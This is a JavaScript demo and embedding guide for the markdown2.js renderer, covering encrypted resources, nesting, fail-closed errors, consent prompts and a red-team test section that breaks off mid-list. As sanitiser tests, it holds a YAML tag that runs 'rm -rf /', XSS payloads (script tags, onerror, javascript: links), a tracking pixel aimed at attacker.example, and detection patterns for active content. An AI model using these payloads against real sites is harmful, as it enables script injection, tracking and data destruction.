/**
 * Example page for markdown2.js: a feature showcase and an embedding guide.
 * Imports the built library exactly as an outside page would. Kept in its own
 * file so the page runs under a CSP without 'unsafe-inline'.
 */
import {
  core,
  defaultConsent,
  defaultCss,
  defineElement,
  encryptAge,
  gzipBase64,
  Marked,
  marked,
  mount,
  REQUIRES_ASYNC,
  resource,
  version,
} from './markdown2.js';

const PASS = 'markdown2';
const WORK_FACTOR = 12; // fast to unlock, fine for a demo

// ================================================================ helpers

function $(id) {
  const e = document.getElementById(id);
  if (!e) throw new Error(`#${id} missing`);
  return e;
}

function h(tag, props = {}, ...kids) {
  const e = document.createElement(tag);
  Object.assign(e, props);
  e.append(...kids);
  return e;
}

function showError(e) {
  const b = $('error');
  const msg = `The example could not run: ${e instanceof Error ? e.message : String(e)}`;
  b.textContent = b.hidden ? msg : `${b.textContent}\n${msg}`;
  b.hidden = false;
  console.error(e);
}

function run(fn) {
  return Promise.resolve()
    .then(fn)
    .catch(showError);
}

function showDiagnostics(ul, diags) {
  ul.replaceChildren(
    ...(diags.length === 0
      ? [h('li', { className: 'muted', textContent: 'No diagnostics.' })]
      : diags.map((d) =>
          h('li', {
            textContent: `line ${d.line + 1}${d.nodeId ? ` [${d.nodeId}]` : ''}: ${d.code}: ${d.message}`,
          }),
        )),
  );
}

function debounce(fn, wait) {
  let t;
  return (...args) => {
    clearTimeout(t);
    t = setTimeout(() => fn(...args), wait);
  };
}

const ms = (x) => (x < 10 ? `${x.toFixed(2)} ms` : `${Math.round(x).toLocaleString()} ms`);
const utf8 = new TextEncoder();
const decode = (bytes) => new TextDecoder().decode(bytes);
const esc = (s) => core.escapeHtml(String(s));

function fmtBytes(n) {
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / (1024 * 1024)).toFixed(2)} MB`;
}

function toBase64(text) {
  const bytes = utf8.encode(text);
  let s = '';
  for (let i = 0; i < bytes.length; i += 0x8000) s += String.fromCharCode(...bytes.subarray(i, i + 0x8000));
  return btoa(s).replace(/.{76}/g, '$&\n').trim();
}

/** A terminator that no line of the payload can match. Nothing ever needs escaping. */
function safeToken(base, payload) {
  let clean = String(base || 'DATA')
    .toUpperCase()
    .replace(/[^A-Z0-9_]/g, '');
  if (!/^[A-Z]/.test(clean)) clean = `R${clean}`;
  const lines = new Set(payload.split(/\r?\n/).map((l) => l.replace(/[ \t]+$/, '')));
  let token = clean;
  let n = 1;
  while (lines.has(token)) token = `${clean}${++n}`;
  return { token, base: clean, collisions: n - 1 };
}

function parseToFragment(html) {
  const tpl = document.createElement('template');
  tpl.innerHTML = html; // inert: nothing in a template runs or loads
  return tpl.content;
}

// The default look, in the user-agent cascade layer so page styles win.
const baseSheet = new CSSStyleSheet();
baseSheet.replaceSync(defaultCss);
document.adoptedStyleSheets = [...document.adoptedStyleSheets, baseSheet];

$('version').textContent = `v${version}`;

// ================================================================ playground scenes

async function vaultSource() {
  const inner = await encryptAge(
    'The innermost secret. It needed its own unlock: keys never pass from a document to the resources inside it.\n',
    PASS,
    { workFactor: WORK_FACTOR },
  );
  const vaultMd = [
    '## Q3 notes',
    '',
    'Revenue grew **12%** quarter on quarter.',
    '',
    resource({ type: 'text/csv', title: 'Revenue by region', token: 'FIG', payload: 'Region,Revenue\nNorth,42\nSouth,31\nEast,18' }),
    '',
    resource({ type: 'text/plain', encoding: 'base64 age', title: 'Inner vault', token: 'INNER', payload: inner }),
    '',
  ].join('\n');
  const vault = await encryptAge(vaultMd, PASS, { workFactor: WORK_FACTOR });
  const vault2 = await encryptAge(
    'A second vault, sealed with the same passphrase.\n\nAfter the first unlock, the view offers to try that key here too, and lists every resource first.\n',
    PASS,
    { workFactor: WORK_FACTOR },
  );

  return [
    resource({
      type: 'text/css',
      rel: 'stylesheet',
      token: 'STYLE',
      wrap: true,
      payload: [
        'md2-resource.callout { border-left: 4px solid #b0802a; }',
        'md2-section[level="2"] > h2 { color: #0f6b5f; }',
        '/* Remote url() references are removed before the sheet applies. */',
        'md2-document { background-image: url(https://example.org/never-fetched.png); }',
      ].join('\n'),
    }),
    '',
    '# Vaults and locks',
    '',
    'Nothing below unlocks or fetches on its own. Use the buttons on each card, or the app controls.',
    '',
    resource({
      type: 'text/markdown',
      title: 'Styled by the document',
      token: 'CALLOUT',
      attributes: { 'md2-class': 'callout' },
      payload: "This card's gold edge comes from the document's own stylesheet. Untick *Document styles* in the panel and it goes.",
    }),
    '',
    '## Encrypted sections',
    '',
    'The passphrase is `markdown2`. Unlocking the outer vault reveals a third one inside it, still locked.',
    '',
    resource({ type: 'text/markdown', encoding: 'base64 age', title: 'Q3 notes (encrypted)', token: 'VAULT', payload: vault }),
    '',
    resource({ type: 'text/markdown', encoding: 'base64 age', title: 'Second vault', token: 'VAULT2', payload: vault2 }),
    '',
    '## Saving',
    '',
    'This attachment asks to be saved as `page.html`. *Download* in the panel offers the safe name first:',
    '',
    resource({ type: 'text/html', rel: 'attachment', filename: 'page.html', token: 'PAGE', payload: '<h1>Saved, never rendered</h1>' }),
    '',
  ].join('\n');
}

const OPACITY = `# Opacity, or: nothing needs escaping

Markdown has a dozen ways to misread a stray character. Inside a resource there are none. Every byte between the opening line and the terminator goes, untouched, to the handler for the declared type.

<<<GAUNTLET type="text/plain" title="A payload built to confuse Markdown"
# Not a heading
> not a quote
- not a list
| not | a | table |
\`\`\`js
not a fence, never closed
<<<NESTED type="text/html"
<b>not HTML, and not a resource either</b>
NESTED
*** not a rule ***
GAUNTLET

## You pick the word that ends it

This payload contains a line that reads \`END\`, so the block below ends at \`END2\` instead:

<<<END2 type="text/plain" title="A terminator chosen to fit"
first line
END
still inside: END was only a line of text here
END2

Try it: rename \`END2\` to \`END\` in both places and watch the resource close one line too early. The leftovers spill into the prose, and the X-ray tab shows why.

## Opaque bytes, typed views

The same bytes mean different things under different types. Here they are JSON:

<<<SAME type="application/json" title="Typed as application/json"
{"note": "# still not a heading", "list": ["- not", "- a list"]}
SAME
`;

const NESTING = `# Documents inside documents

<<<CASE type="text/markdown" title="Case file 41-B"
## Case file 41-B

Filed by the night desk. Ordinary Markdown: **bold**, *italic*, a [link](https://commonmark.org).

The evidence bag below is a whole document of its own, and it brought a stylesheet.

<<<BAG type="text/markdown" title="Evidence bag" md2-class="bag"
<<<BAGSTYLE type="text/css" rel="stylesheet"
p { font-family: ui-monospace, monospace; }
h3 { letter-spacing: 0.2em; text-transform: uppercase; color: #b4441c; }
BAGSTYLE
### Evidence bag

Monospace paragraphs and a spaced-out heading: this bag's stylesheet applies here, and only here.

<<<ITEM1 type="text/plain" title="Item 1: a note"
Meet at the observatory. Bring the key.
ITEM1

<<<ITEM2 type="text/csv" title="Item 2: a ledger"
Date,Paid to,Amount
03-11,Harbour office,120
03-14,"Smith, J.",75
ITEM2
BAG

Back in the case file: plain paragraphs again. The bag's styles could not reach out here, so a nested section can never restyle the document around it, for instance to hide a warning.
CASE

The outer page is untouched too.
`;

const FAILURES = `# A museum of broken things

Every exhibit below is broken on purpose. None of them leaks its bytes into the page. Each one becomes a labelled card and a diagnostic, so open the X-ray tab.

<<<NOTYPE title="Exhibit A: no type at all"
# If you can read this as a heading, something went wrong.
NOTYPE

<<<NEARMISS type="image/jpg" title="Exhibit B: a near miss"
the correct name is image/jpeg; you get a hint, never a silent fix
NEARMISS

<<<FUTURE type="model/x-holodeck" title="Exhibit C: a format nobody can draw" filename="bridge.holo"
opaque bytes from the twenty-fourth century
FUTURE

<<<BADB64 type="text/plain" encoding="base64" title="Exhibit D: base64 that isn't"
!!! this is not base64 !!!
BADB64

<<<ZSTD type="text/plain" encoding="base64 zstd" title="Exhibit E: a decoder this reader lacks"
KLUv/QBYYQAA
ZSTD

<<<BADJSON type="application/json" title="Exhibit F: JSON with a missing brace"
{"ok": true, "missing": "a closing brace"
BADJSON

The last exhibit never ends. Everything after its opening line becomes its payload, so this sentence is the last prose you will see rendered.

<<<FOREVER type="text/plain" title="Exhibit G: no terminator"
I was supposed to end at FOREVER.
This line is opaque now.
So is this one.
`;

const ALTERNATES = `---
title: Postcards from 2077
author: The future
---
# Postcards from 2077

This page uses formats nobody has built yet. A reader shows what it can, and says what it couldn't. It never drops anything quietly.

## An alternate

This reader cannot draw a hologram, so it shows the plain-text alternate that follows it. A reader that could draw it would show the hologram instead. Never both.

<<<HOLO type="model/x-hologram" title="A spinning city"
opaque hologram data
HOLO
<<<HOLOTEXT type="text/plain" rel="alternate" title="Described in words"
A small city spins slowly above a desk, its towers lit gold and green.
HOLOTEXT

## A description

The text after this drawing becomes its alternative text, for screen readers:

<<<SKYLINE type="image/svg+xml" title="A skyline"
<svg xmlns="http://www.w3.org/2000/svg" width="240" height="90" viewBox="0 0 240 90"><rect width="240" height="90" rx="10" fill="#1c1a24"/><circle cx="196" cy="22" r="10" fill="#f4d796"/><rect x="20" y="40" width="22" height="50" fill="#0f6b5f"/><rect x="48" y="24" width="18" height="66" fill="#57c0ac"/><rect x="72" y="50" width="30" height="40" fill="#0f6b5f"/><rect x="108" y="14" width="16" height="76" fill="#b0802a"/><rect x="130" y="44" width="26" height="46" fill="#57c0ac"/><rect x="162" y="34" width="20" height="56" fill="#0f6b5f"/><rect x="188" y="56" width="32" height="34" fill="#b0802a"/></svg>
SKYLINE
<<<SKYDESC type="text/plain" rel="describedby"
Eight towers of different heights under a pale moon, in teal and gold.
SKYDESC

## An attachment

\`rel="attachment"\` means "save me", not "show me". This one asks to be called \`postcard.html\`. The safe name comes first; the active extension needs consent:

<<<CARD type="text/html" rel="attachment" filename="postcard.html" title="A postcard"
<h1>Wish you were here</h1>
CARD

The front matter at the top is metadata: consumed, not displayed.
`;

const DATA = `---
title: Mission log
mission: Kestrel-7
---
# Mission log: Kestrel-7

Telemetry arrives as JSON, the crew list as CSV, the schedule as TSV. Each one is declared, so none of them is guessed.

<<<TELEMETRY type="application/json" title="Telemetry, pretty-printed"
{"t":"T+00:42:17","altitude_km":412.6,"velocity_kms":7.66,"systems":{"power":"nominal","comms":"nominal","thermal":"watch"},"alerts":[]}
TELEMETRY

<<<CREW type="text/csv" title="Crew, with quoting"
Name,Role,Notes
"Okafor, A.",Commander,"First flight: 2061"
Lindqvist,Pilot,"Says ""hello"" to every satellite"
Mbeki,Engineer,"Brought
a ukulele"
CREW

<<<SCHEDULE type="text/tab-separated-values" title="Schedule (TSV)"
Time	Task	Owner
06:00	Wake	All
06:30	Systems check	Mbeki
08:00	Orbit burn	Lindqvist
12:00	Downlink	Okafor
SCHEDULE

<<<READINGS type='text/csv; header=absent' title="Raw readings, no header row"
04:00,18.2,ok
04:10,18.6,ok
04:20,21.9,watch
READINGS

YAML is shown as text and never instantiated, so even a hostile tag is just characters:

<<<CONFIG type="application/yaml" title="Flight config"
mission: Kestrel-7
burns: [08:00, 20:00]
payload: !!python/object/apply:os.system ["rm -rf /"]
CONFIG
`;

const DIAGRAMS = `# Drawings, inert by design

SVG and WaveDrom are drawn through \`<img>\`, where scripts can never run.

## A timing diagram, from a fence

\`\`\`wavedrom
{ signal: [
  { name: "cs",   wave: "10.......1" },
  { name: "sclk", wave: "0.p.....l." },
  { name: "mosi", wave: "x.3.4.5.x.", data: ["cmd", "addr", "data"] },
  { name: "miso", wave: "z.....6.z.", data: ["reply"] }
],
  head: { text: "An SPI transaction" }
}
\`\`\`

## A register map, as a resource

<<<STATUS type="text/vnd.wavedrom" title="STATUS register"
{ reg: [
  { bits: 1, name: "BUSY", attr: "RO" },
  { bits: 1, name: "ERR",  attr: "W1C" },
  { bits: 2 },
  { bits: 4, name: "FIFO", attr: "RO" },
  { bits: 8, name: "COUNT", attr: "RO" }
],
  config: { hspace: 640, bits: 16 }
}
STATUS

## An SVG with a script in it

The script below never runs: an image cannot execute anything.

<<<ORBIT type="image/svg+xml" title="An orbit, with a harmless script"
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="120" viewBox="0 0 200 120"><ellipse cx="100" cy="60" rx="80" ry="36" fill="none" stroke="#b0802a" stroke-width="2" stroke-dasharray="4 4"/><circle cx="100" cy="60" r="16" fill="#f4d796"/><circle cx="174" cy="48" r="7" fill="#0f6b5f"/><script>alert('this never runs')</script></svg>
ORBIT
`;

const REMOTE = `# Remote content, on your say-so

Opening this page fetched nothing. Each resource below names a server and waits for you.

## A remote image

Fetched without cookies when you allow it, and treated as its declared type, whatever the server says:

<<<ICON type="image/svg+xml" encoding="uri" title="The Markdown2 icon"
https://md2.cognotik.com/icon.svg
ICON

## An embedded page

The address decodes freely, but showing it in a frame reaches the network, so it waits too. Trust \`https://www.openstreetmap.org\` in the panel and it loads without asking.

<<<ABBEY type="text/uri-list" title="Mont-Saint-Michel"
# An island abbey, at high tide or low
https://www.openstreetmap.org/export/embed.html?bbox=-1.5200%2C48.6300%2C-1.4900%2C48.6420&layer=mapnik
ABBEY

## One that will never load

Plain \`http:\` is refused outright, so this one fails closed:

<<<PLAIN type="text/uri-list" title="An insecure address"
http://example.org/
PLAIN
`;

const PRESETS = {
  vaults: {
    label: 'Vaults and locks',
    blurb: 'Encrypted sections, nested vaults and a key that is never inherited. Try “Unlock with the app’s key”, then “Forget keys”.',
    source: vaultSource,
  },
  opacity: {
    label: 'Opacity',
    blurb: 'Everything inside a resource is bytes until its terminator. Headings, fences and even other <<< lines are just text.',
    source: OPACITY,
  },
  nesting: {
    label: 'Nesting',
    blurb: 'A case file holds an evidence bag that holds evidence. Each level is a document, and its styles stay inside it.',
    source: NESTING,
  },
  failures: {
    label: 'Fail closed',
    blurb: 'Seven ways to break a resource. Each becomes a labelled card and a diagnostic. None leaks its bytes.',
    source: FAILURES,
  },
  alternates: {
    label: 'Alternates',
    blurb: 'Formats from the future, plain-text alternates, image descriptions and an attachment with a risky name.',
    source: ALTERNATES,
  },
  data: {
    label: 'Data',
    blurb: 'JSON, CSV with awkward quoting, TSV, a header-less table and hostile YAML. All declared, nothing sniffed.',
    source: DATA,
  },
  diagrams: {
    label: 'Diagrams',
    blurb: 'WaveDrom timing diagrams and register maps, and an SVG with a script that never runs.',
    source: DIAGRAMS,
  },
  remote: {
    label: 'Remote',
    blurb: 'Images and embedded pages that wait for permission. Try the consent policy switch in the panel.',
    source: REMOTE,
  },
};

function presetSource(key) {
  const p = PRESETS[key];
  if (typeof p.source !== 'function') return Promise.resolve(p.source);
  p.cache ??= p.source();
  return p.cache;
}

// ================================================================ 1: playground

let playground = null;

function describeRequest(req) {
  switch (req.kind) {
    case 'key':
      return `key for “${req.resource.label}” (layer ${req.layer} of ${req.layers})`;
    case 'remote':
      return `${req.reason === 'fetch' ? 'fetch' : 'show'} “${req.resource.label}” from ${req.host}`;
    case 'batch':
      return `try the same key on ${req.resources.length} more`;
    case 'save-name':
      return `save as “${req.requested}” instead of “${req.safeName}”`;
    default:
      return req.kind;
  }
}

function describeAnswer(req, answer) {
  if (req.kind === 'key') return answer ? 'key given (memory only)' : 'cancelled';
  if (req.kind === 'remote') return answer === 'always' ? `always allow ${req.host}` : answer === 'once' ? 'this one only' : 'not now';
  return answer === true ? 'yes' : 'no';
}

function logConsent(req, answer, by) {
  const log = $('consent-log');
  log.querySelector('.muted')?.remove();
  // Never log the key itself.
  log.prepend(
    h(
      'li',
      {},
      h('strong', { textContent: describeRequest(req) }),
      h('span', { textContent: ` → ${describeAnswer(req, answer)} ` }),
      h('em', { textContent: by === 'ask' ? '(asked)' : `(policy: ${by})` }),
    ),
  );
}

function preview(text, n = 60) {
  const one = text.replace(/\s+/g, ' ').trim();
  return one.length > n ? `${one.slice(0, n)}…` : one;
}

function xray(src) {
  let tokens;
  try {
    tokens = marked.lexer(src);
  } catch (e) {
    $('xray').replaceChildren(h('li', { textContent: `lexer() threw: ${e instanceof Error ? e.message : e}` }));
    return;
  }
  $('xray').replaceChildren(
    ...tokens.map((t) => {
      const desc =
        t.type === 'markdown'
          ? preview(t.text ?? '')
          : `${t.token ?? '?'} · ${t.mediaType ?? '(no type)'}${t.rel && t.rel !== 'inline' ? ` · ${t.rel}` : ''}${t.error ? ` · ${t.error}` : ''}`;
      return h(
        'li',
        { className: `tok tok-${t.type}${t.error ? ' tok-err' : ''}` },
        h('span', { className: 'tok-line', textContent: typeof t.line === 'number' ? `L${t.line + 1}` : '' }),
        h('span', { className: 'tok-type', textContent: t.type }),
        h('span', { className: 'tok-desc', textContent: desc }),
      );
    }),
  );
}

function setupTabs() {
  const tabs = [...document.querySelectorAll('.tab')];
  for (const t of tabs) {
    t.addEventListener('click', () => {
      for (const x of tabs) {
        const on = x === t;
        x.setAttribute('aria-selected', String(on));
        const pane = document.querySelector(`[data-pane="${x.dataset.tab}"]`);
        if (pane) pane.hidden = !on;
      }
    });
  }
}

async function demoPlayground() {
  const editor = $('live-src');
  const chips = $('presets');
  let view = null;
  let current = 'vaults';
  let policy = 'ask';

  const markChips = () => {
    for (const b of chips.querySelectorAll('button')) b.setAttribute('aria-pressed', String(b.dataset.preset === current));
  };
  chips.replaceChildren(
    ...Object.entries(PRESETS).map(([key, p]) => {
      const b = h('button', { type: 'button', className: 'chip', textContent: p.label });
      b.dataset.preset = key;
      b.addEventListener('click', () => {
        void select(key);
      });
      return b;
    }),
  );
  markChips();
  $('preset-blurb').textContent = PRESETS[current].blurb;

  let currentSource = await presetSource(current);
  editor.value = currentSource;

  const renderPanel = (state) => {
    const body = $('res-table').tBodies[0];
    body.replaceChildren(
      ...state.resources.map((r) => {
        const actions = h('td', { className: 'actions' });
        const btn = (text, act) => {
          const b = h('button', { type: 'button', className: 'btn small', textContent: text });
          b.addEventListener('click', () => {
            void act();
          });
          actions.append(b);
        };
        if (r.needs === 'key') btn('Unlock…', () => view.unlock(r.id));
        else if (r.needs === 'remote' && r.state === 'locked') btn(`Fetch from ${r.remote?.host ?? 'the web'}…`, () => view.unlock(r.id));
        else if (r.needs === 'remote') btn(`Load ${r.remote?.host ?? ''}…`, () => view.load(r.id));
        if (r.state === 'decoded') btn('Download', () => view.download(r.id, 'decoded'));
        btn('Raw', () => view.download(r.id, 'raw'));
        const name = h(
          'td',
          {},
          h('span', { className: 'res-label', textContent: r.label }),
          h('small', { textContent: `${r.type ?? '(no type)'}${r.rel !== 'inline' ? ` · ${r.rel}` : ''}${r.nested ? ' · nested' : ''}` }),
        );
        const st = h('td', {}, h('span', { className: `state state-${r.state}`, textContent: r.error ? `${r.state} · ${r.error}` : r.state }));
        return h('tr', {}, name, st, actions);
      }),
    );

    const origins = $('origins');
    origins.replaceChildren(
      ...(state.origins.length === 0
        ? [h('li', { className: 'muted', textContent: 'None. Every remote resource asks first.' })]
        : state.origins.map((o) => {
            const b = h('button', { type: 'button', className: 'btn small', textContent: 'Revoke' });
            b.addEventListener('click', () => {
              void view.revokeOrigin(o);
            });
            return h('li', {}, h('code', { textContent: o }), b);
          })),
    );
    const n = state.diagnostics.length;
    $('live-diags').textContent = `· ${n}`;
    showDiagnostics($('play-diags'), state.diagnostics);
  };

  view = mount($('live-view'), currentSource, {
    baseUrl: location.href,
    onChange: renderPanel,
    consent: async (req) => {
      let answer;
      if (policy === 'deny') answer = req.kind === 'batch' || req.kind === 'save-name' ? false : null;
      else if (policy === 'once' && req.kind === 'remote') answer = 'once';
      else if (policy === 'once' && req.kind === 'batch') answer = true;
      else answer = await defaultConsent(req);
      logConsent(req, answer, policy === 'ask' || (policy === 'once' && req.kind !== 'remote' && req.kind !== 'batch') ? 'ask' : policy);
      return answer;
    },
  });
  await view.ready;
  xray(currentSource);

  let seq = 0;
  const apply = async (src) => {
    const mine = ++seq;
    const t0 = performance.now();
    await view.update(src);
    if (mine !== seq) return;
    $('play-time').textContent = `Rendered in ${ms(performance.now() - t0)}`;
    xray(src);
  };

  async function select(key) {
    current = key;
    markChips();
    $('preset-blurb').textContent = PRESETS[key].blurb;
    currentSource = await presetSource(key);
    if (current !== key) return;
    editor.value = currentSource;
    await apply(currentSource);
  }

  editor.addEventListener(
    'input',
    debounce(() => {
      void apply(editor.value);
    }, 250),
  );
  $('reset-src').addEventListener('click', () => {
    editor.value = currentSource;
    void apply(currentSource);
  });
  $('policy').addEventListener('change', (e) => {
    policy = e.target.value;
  });
  $('doc-styles').addEventListener('change', (e) => {
    view.setDocumentStyles(e.target.checked);
  });
  $('forget').addEventListener('click', () => {
    void view.forget();
  });
  $('app-unlock').addEventListener('click', async () => {
    // Keys supplied by the app itself: no dialog, no batch offer.
    // Repeat while new locked resources appear (nested vaults are revealed by unlocking).
    for (let round = 0; round < 4; round++) {
      const pending = view.state().resources.filter((r) => r.needs === 'key');
      if (pending.length === 0) break;
      for (const r of pending) await view.unlock(r.id, { kind: 'passphrase', value: PASS });
    }
  });
  $('allow-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const err = $('allow-error');
    err.hidden = true;
    try {
      await view.allowOrigin($('allow-input').value.trim());
      $('allow-input').value = '';
    } catch (x) {
      err.textContent = x instanceof Error ? x.message : String(x);
      err.hidden = false;
    }
  });

  playground = {
    async open(src, blurb) {
      current = null;
      markChips();
      $('preset-blurb').textContent = blurb;
      currentSource = src;
      editor.value = src;
      $('play').scrollIntoView({ behavior: 'smooth', block: 'start' });
      await apply(src);
    },
  };
}

// ================================================================ 2: resource lab

const LAB_SAMPLES = {
  tricky: {
    label: 'A payload that fights back',
    type: 'text/plain',
    token: 'DATA',
    title: 'Packed in the lab',
    text: [
      '# Looks like a heading. Is not.',
      '```js',
      "const end = 'DATA';",
      '```',
      'DATA',
      '<<<FAKE type="text/html"',
      "<script>alert('still just bytes')</script>",
      'FAKE',
    ].join('\n'),
  },
  markdown: {
    label: 'A document to seal',
    type: 'text/markdown',
    token: 'MEMO',
    title: 'Board memo',
    text: '## Board memo\n\nThe merger is **off**. Tell no one.\n\n| Option | Votes |\n| --- | ---: |\n| Proceed | 2 |\n| Cancel | 5 |\n',
  },
  svg: {
    label: 'An SVG to squeeze',
    type: 'image/svg+xml',
    token: 'ART',
    title: 'Concentric',
    text: `<svg xmlns="http://www.w3.org/2000/svg" width="160" height="160" viewBox="0 0 160 160">${Array.from(
      { length: 12 },
      (_, i) => `<circle cx="80" cy="80" r="${76 - i * 6}" fill="${i % 2 ? '#0f6b5f' : '#b0802a'}"/>`,
    ).join('')}</svg>`,
  },
  csv: {
    label: 'A table',
    type: 'text/csv',
    token: 'ROWS',
    title: 'Lighthouses',
    text: 'Name,Country,Height (m),Lit\nJeddah Light,Saudi Arabia,133,1990\nÎle Vierge,France,82.5,1902\n"Phare de Cordouan",France,67.5,1611\nBell Rock,Scotland,35,1811\n',
  },
};

async function demoLab() {
  let view = null;
  let seq = 0;
  let lastSrc = '';
  let url = null;

  const samples = $('lab-samples');
  samples.append(h('span', { className: 'label inline', textContent: 'Try:' }));
  for (const [key, s] of Object.entries(LAB_SAMPLES)) {
    const b = h('button', { type: 'button', className: 'btn small', textContent: s.label });
    b.addEventListener('click', () => {
      $('lab-input').value = s.text;
      $('lab-type').value = s.type;
      $('lab-token').value = s.token;
      $('lab-title').value = s.title;
      if (key === 'markdown') $('lab-enc').value = 'age';
      else if (key === 'svg') $('lab-enc').value = 'gzip';
      else if (key === 'tricky') $('lab-enc').value = 'none';
      void build();
    });
    samples.append(b);
  }

  const s0 = LAB_SAMPLES.tricky;
  $('lab-input').value = s0.text;

  async function build() {
    const mine = ++seq;
    const text = $('lab-input').value;
    const type = $('lab-type').value;
    const enc = $('lab-enc').value;
    const title = $('lab-title').value.trim();
    const base = $('lab-token').value;
    const pass = $('lab-pass').value || PASS;
    $('lab-pass-row').hidden = enc !== 'age';

    let payload = text;
    let encoding;
    const t0 = performance.now();
    if (enc === 'base64') {
      payload = toBase64(text);
      encoding = 'base64';
    } else if (enc === 'gzip') {
      payload = await gzipBase64(text);
      encoding = 'base64 gzip';
    } else if (enc === 'age') {
      payload = await encryptAge(text, pass, { workFactor: WORK_FACTOR });
      encoding = 'base64 age';
    }
    const encodeMs = performance.now() - t0;
    if (mine !== seq) return;

    const { token, base: cleanBase, collisions } = safeToken(base, payload);
    const props = { type, token, payload };
    if (encoding) props.encoding = encoding;
    if (title) props.title = title;
    const src = resource(props);
    lastSrc = src;
    $('lab-src').textContent = src;

    const inBytes = utf8.encode(text).length;
    const outBytes = utf8.encode(payload).length;
    const parts = [
      `${fmtBytes(inBytes)} in, ${fmtBytes(outBytes)} as written (${inBytes ? Math.round((outBytes / inBytes) * 100) : 0}%).`,
    ];
    if (enc !== 'none') parts.push(`Encoded in ${ms(encodeMs)}.`);
    if (collisions > 0) {
      parts.push(
        `The payload already holds ${collisions === 1 ? 'a line' : `${collisions} lines`} that would end the block early, so the terminator became ${token} instead of ${cleanBase}.`,
      );
    } else {
      parts.push(`Terminator: ${token}.`);
    }
    if (enc === 'age') parts.push('The view below stays locked until you unlock it with the passphrase.');
    $('lab-stats').textContent = parts.join(' ');

    if (url) URL.revokeObjectURL(url);
    url = URL.createObjectURL(new Blob([src], { type: 'text/markdown' }));
    $('lab-download').href = url;

    if (!view) {
      view = mount($('lab-view'), src, { baseUrl: location.href, consent: defaultConsent });
      await view.ready;
    } else {
      await view.update(src);
    }
  }

  const rebuild = debounce(() => {
    void build().catch(showError);
  }, 300);
  $('lab-form').addEventListener('input', rebuild);
  $('lab-form').addEventListener('change', rebuild);
  $('lab-form').addEventListener('submit', (e) => e.preventDefault());

  $('lab-copy').addEventListener('click', async (e) => {
    const b = e.currentTarget;
    try {
      await navigator.clipboard.writeText(lastSrc);
      b.textContent = 'Copied';
    } catch {
      b.textContent = 'Copy blocked';
    }
    setTimeout(() => {
      b.textContent = 'Copy';
    }, 1500);
  });
  $('lab-send').addEventListener('click', () => {
    if (!playground) return;
    const doc = `# From the resource lab\n\nPacked a moment ago. Edit it, break it, or unlock it.\n\n${lastSrc}\n`;
    void playground.open(doc, 'A resource you packed in the lab. Every encoding in it was applied in your browser.');
  });

  await build();
}

// ================================================================ 3: matryoshka

function dollsSource(depth, same) {
  const tok = (k) => (same ? 'DOC' : `L${k}`);
  const coreTok = same ? 'DOC' : 'CORE';
  let inner = `<<<${coreTok} type="text/plain" title="The core"\nYou reached the core, ${depth} document${depth === 1 ? '' : 's'} down.\n${coreTok}`;
  for (let k = depth; k >= 1; k--) {
    const line = k === depth ? 'The innermost document.' : `Each level is a whole document. ${depth - k} more inside.`;
    inner = `<<<${tok(k)} type="text/markdown" title="Level ${k} of ${depth}"\n**Level ${k}.** ${line}\n\n${inner}\n${tok(k)}`;
  }
  return `# Matryoshka\n\n${inner}\n\nBack at the surface.\n`;
}

function demoNest() {
  const render = () => {
    const depth = Number($('nest-depth').value);
    const same = $('nest-same').checked;
    $('nest-depth-out').textContent = String(depth);
    const src = dollsSource(depth, same);
    $('nest-src').textContent = src;
    const diags = [];
    const t0 = performance.now();
    const html = marked.parse(src, { idPrefix: 'nest-', onDiagnostics: (d) => diags.push(...d) });
    const took = performance.now() - t0;
    const out = $('out-nest');
    out.innerHTML = html;
    const resources = [...out.querySelectorAll('md2-resource')];
    let deepest = 0;
    for (const r of resources) {
      let d = 0;
      for (let p = r; p && p !== out; p = p.parentElement) if (p.localName === 'md2-resource') d++;
      deepest = Math.max(deepest, d);
    }
    const msg = `${resources.length} resource${resources.length === 1 ? '' : 's'} rendered, nested ${deepest} deep, in ${ms(took)}. ${diags.length} diagnostic${diags.length === 1 ? '' : 's'}.`;
    $('nest-stats').textContent = same
      ? `${msg} With one shared terminator, the outer document ended at the first DOC line, which belonged to the core. The remaining DOC lines spilled into the prose.`
      : msg;
  };
  $('nest-depth').addEventListener('input', render);
  $('nest-same').addEventListener('change', render);
  render();
}

// ================================================================ 4: red team

const ACTIVE_SELECTOR = 'script, iframe, frame, frameset, object, embed, applet, base, meta, link, form, portal';
const BAD_URL = /^(javascript|vbscript|data:text\/html|data:application\/xhtml)/;

const noActiveElements = (root) => root.querySelectorAll(ACTIVE_SELECTOR).length === 0;
function noHandlers(root) {
  for (const el of root.querySelectorAll('*')) for (const a of el.attributes) if (/^on/i.test(a.name)) return false;
  return true;
}
function safeUrls(root) {
  for (const el of root.querySelectorAll('*')) {
    for (const a of el.attributes) {
      const name = a.name.toLowerCase();
      if (name === 'srcdoc') return false;
      if (!/(href|src|action|formaction|data|poster)$/.test(name)) continue;
      // eslint-disable-next-line no-control-regex
      const v = a.value.replace(/[\u0000-\u0020]/g, '').toLowerCase();
      if (BAD_URL.test(v)) return false;
    }
  }
  return true;
}
function nothingRemote(root) {
  for (const el of root.querySelectorAll('[src], [srcset], [poster], [background]')) {
    for (const name of ['src', 'srcset', 'poster', 'background']) {
      const v = el.getAttribute(name);
      if (v && /(^|\s|,)(https?:)?\/\//i.test(v)) return false;
    }
  }
  return true;
}
const absent = (needle) => (root) => !root.textContent.includes(needle);

const STD = [
  ['No script, frame, object or form elements', noActiveElements],
  ['No event-handler attributes', noHandlers],
  ['No javascript:, vbscript: or data:text/html URLs', safeUrls],
];

const SEALED_SECRET = 'Rendezvous at dawn, pier nine';

const ATTACKS = [
  {
    title: 'Script in the prose',
    threat: 'Raw HTML, comments, tables and a tracking pixel, all trying to run or phone home.',
    src: `# Hello <script>alert('prose')</script>

An image with a handler: <img src=x onerror="alert('img')">

<iframe src="https://attacker.example/"></iframe>

<!-- --><script>alert('comment')</script>

A tracking pixel in image syntax: ![pixel](https://attacker.example/pixel.png?who=you)

| cell | <svg onload="alert('table')"> |
| ---- | ---- |
| <a href="javascript:alert(1)">x</a> | ok |
`,
    checks: [...STD, ['No remote image loads, not even the pixel', nothingRemote]],
  },
  {
    title: 'Dangerous links',
    threat: 'Every way to spell javascript: that a sanitiser might miss, and one honest link.',
    src: `- [plain](javascript:alert(1))
- [mixed case](JaVaScRiPt:alert(1))
- [tab inside](java\tscript:alert(1))
